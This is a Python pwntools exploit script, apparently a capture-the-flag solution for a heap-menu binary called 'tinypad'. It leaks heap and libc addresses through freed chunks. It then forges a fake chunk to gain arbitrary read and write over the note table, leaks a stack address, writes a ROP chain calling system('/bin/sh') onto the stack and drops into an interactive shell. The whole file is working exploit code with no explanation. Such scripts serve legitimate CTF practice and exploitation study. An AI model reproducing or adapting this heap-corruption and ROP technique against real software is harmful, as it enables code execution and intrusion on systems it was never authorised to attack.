#!/usr/bin/env python

from pwn import *
import struct

context.log_level = "debug"

elf = "./tinypad"

system_off = 0x45390
bin_sh_off = 0x18cd57
libc_argv_off = 0x3c92f8
pop_rdi_ret = 0x4013d3
pop_rsp_3pop_ret = 0x4013cd

p = process(elf)

def add(s):
    p.recvuntil("(CMD)>>> ")
    p.sendline("A")
    p.recvuntil("(SIZE)>>> ")
    p.sendline(str(len(s)))
    p.recvuntil("(CONTENT)>>> ")
    p.sendline(s)

def delete(idx):
    p.recvuntil("(CMD)>>> ")
    p.sendline("D")
    p.recvuntil("(INDEX)>>> ")
    p.sendline(str(idx))

def edit(idx, s):
    p.recvuntil("(CMD)>>> ")
    p.sendline("E")
    p.recvuntil("(INDEX)>>> ")
    p.sendline(str(idx))
    p.recvuntil("(CONTENT)>>> ")
    p.sendline(s)
    p.recvuntil("Is it OK?\n")
    p.recvuntil("(Y/n)>>> ")
    p.sendline("Y")


add("A"*0x90)
add("B"*0x90)
add("C"*0x90)
add("D"*0xf0)
delete(3)
delete(1)

p.recvuntil(" #   INDEX: 1\n")
p.recvuntil(" # CONTENT: ")
heap_base = u64(p.recv(4).strip().ljust(8, "\x00"))-0x140
p.recvuntil(" #   INDEX: 3\n")
p.recvuntil(" # CONTENT: ")
libc_base = u64(p.recv(6).strip().ljust(8, "\x00"))-0x3c4b78
log.info("heap_base: "+hex(heap_base))
log.info("libc_base: "+hex(libc_base))

system_addr = libc_base+system_off
bin_sh_addr = libc_base+bin_sh_off
libc_argv_addr = libc_base+libc_argv_off

offsize = (heap_base+0x1e0)-0x6020a0

payload = p8(0)*0x68
payload += p64(offsize, sign=True)
payload += p64(0x6020a0)*4
edit(2, payload)

payload = p8(0)*0x90
payload += p64(offsize, sign=True)
add(payload)

delete(4)

payload = p8(0)*0x90
payload += p64(8)+p64(libc_argv_addr)
payload += p64(8)+p64(0x602148)
add(payload)

p.recvuntil(" #   INDEX: 1\n")
p.recvuntil(" # CONTENT: ")
stack_addr = u64(p.recv(6).strip().ljust(8, "\x00"))-0xe0
log.info("stack_addr: "+hex(stack_addr))

# rop chain
edit(2, p64(stack_addr))
edit(1, p64(pop_rdi_ret))
edit(2, p64(stack_addr+0x4))
edit(1, p64(0))
edit(2, p64(stack_addr+0x5))
edit(1, p64(0))
edit(2, p64(stack_addr+0x8))
edit(1, p64(bin_sh_addr))
edit(2, p64(stack_addr+0x10))
edit(1, p64(system_addr))

p.sendline("Q")

p.interactive()
